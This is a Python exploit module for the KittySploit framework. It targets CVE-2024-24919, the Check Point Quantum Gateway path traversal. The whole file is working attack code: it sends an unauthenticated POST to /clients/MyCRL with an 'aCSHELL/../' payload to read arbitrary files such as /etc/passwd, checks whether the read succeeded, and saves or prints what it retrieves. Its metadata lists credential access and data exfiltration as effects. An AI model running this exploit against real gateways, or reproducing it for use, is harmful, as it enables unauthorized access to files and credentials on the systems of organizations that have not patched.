#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Check Point Quantum Gateway arbitrary file read (CVE-2024-24919)."""

from __future__ import annotations

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Check Point Quantum Gateway File Read (CVE-2024-24919)',
        'description': (
            'CVE-2024-24919 path traversal on POST /clients/MyCRL allows unauthenticated '
            'read of local files (e.g. /etc/passwd).'
        ),
        'author': ['watchTowr', 'KittySploit Team'],
        'cve': ['CVE-2024-24919'],
        'platform': Platform.MULTI,
        'references': [
            'https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/',
            'https://support.checkpoint.com/results/sk/sk182337',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-24919',
        ],
        'tags': ['checkpoint', 'quantum', 'lfi', 'file-read', 'kev', 'vkev'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals', 'credentials'],
            'chain': {
                'suggested_followups': ['scanner/http/cve_2024_24919_detect'],
            },
        },
    }

    read_path = OptString('/etc/passwd', 'Absolute remote file path to read', required=False)
    traversal_depth = OptInt(7, 'Number of ../ segments before target path', required=False, advanced=True)
    output_file = OptString('', 'Local path to save retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars printed when output_file empty (0=all)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        path = str(file_path or self.read_path or '/etc/passwd').strip()
        if not path.startswith('/'):
            path = '/' + path
        depth = max(1, int(self.traversal_depth or 7))
        clean = path.lstrip('/')
        payload = f"aCSHELL/{'../' * depth}{clean}\n"
        response = self.http_request(
            method='POST',
            path='/clients/MyCRL',
            data=payload,
            headers={'Accept-Encoding': 'gzip'},
            allow_redirects=False,
        )
        return (response.text or '') if response else ''

    def check(self):
        body = self.execute('/etc/passwd')
        if re.search(r'root:.*:0:0:', body or ''):
            return {
                'vulnerable': True,
                'reason': 'CVE-2024-24919 file read confirmed',
                'confidence': 'high',
            }
        return {'vulnerable': False, 'reason': 'Traversal read failed', 'confidence': 'medium'}

    def run(self):
        remote = str(self.read_path or '/etc/passwd').strip()
        data = self.execute(remote)
        if not data:
            print_error('Could not read file via CVE-2024-24919')
            return False
        if remote == '/etc/passwd' and not re.search(r'root:.*:0:0:', data):
            print_error('Unexpected /etc/passwd content')
            return False
        print_success(f'Read {len(data)} bytes from {remote}')
        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(data)
                print_success(f'Wrote content to {local}')
            except OSError as exc:
                print_error(f'Could not write output_file: {exc}')
                return False
        else:
            limit = int(self.output_limit or 0)
            snippet = data if not limit or len(data) <= limit else data[:limit] + '\n... [truncated]'
            print_info(snippet)
        return True
